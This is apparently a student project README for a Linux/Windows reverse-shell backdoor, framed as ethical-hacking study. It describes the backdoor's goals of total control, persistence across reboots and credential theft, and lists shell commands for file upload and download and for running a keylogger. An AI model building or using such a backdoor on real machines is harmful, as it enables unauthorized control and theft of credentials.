<img src="https://d2z6c3c3r6k4bx.cloudfront.net/uploads/event/logo/1061432/a991d937097e8176adf1ea7196beb80f.png">
<hr>

### Backdoor Project

This project consist in create a bind between two machines and take total control like a shadow. This program shows a connection Client / Server into a Network Enterprise. In any Network connection only needs an input door to scale until to get relevant information. However, a Backdoor can create multiple connections and it can take possession of assets more important of an enterprise and so the attacker can go and go out anytime.<br>

But in this project, the connection will be only one to one (client / server) with a tcp protocol and introduces malware to get credentials.<br><br>

### Objetive

<hr>
1. Take total control of machine<br>
2. Persisten on Reboot<br>


### Specifer

<hr>

### RUN Backdoor:

<hr>

On Server machine:

```
$ ./server_shell
[+] Listening for Incommig Connections...

```

On Client machine:

```
$ ./reverse_shell
```

Server and Client connected

```
$ ./server_shell
[+] Listening for Incommig Connections...
[+] Connection established from: 
[+] Address: 127.0.0.1
[+] port: 46020
[+] Connected
Linux@127.0.0.1#
```

### Commands Shell

```
$ cd      --> Get current directory
$ curr    --> Current directory
$ run     --> Execute a program
$ upload  --> Upload a File to Client
$ downlod --> Downlod a File to Server
$ exit    --> Finish shell
```

```
Linux@127.0.0.1# cd ../            # Before directory
```

```
Linux@127.0.0.1# curr              # Current directory
/home/ubuntu/
```

```
Linux@127.0.0.1# run keylogger     # Program in Linux/Windows
```

```
Linux@127.0.0.1# upload [File]
```

```
Linux@127.0.0.1# download [File]
```

```
Linux@127.0.0.1# exit
$
```

* And basic commands of Linux and Windows terminal
<br>

### Contributors
<hr>
Giovanny Ortegon - 934@holbertonschool.com<br>
Joseph Delgadillo - Author<br>

### Bibligraphy

<hr>
Master Ethical Hacking with Python - Joseph Delgadillo<br>
Hands-on Network programming with C - Lewis Van Winkle<br>
Penetration testing with Shellcode - Hamza Megahed<br>
Pentester Academy - Vivek Ramachandran</li>
<hr>
Copyright &copy;2020 - Giovanny Ortegon - twitter: <a href="https://twitter.com/__sklgio__">@__sklgio__</a>
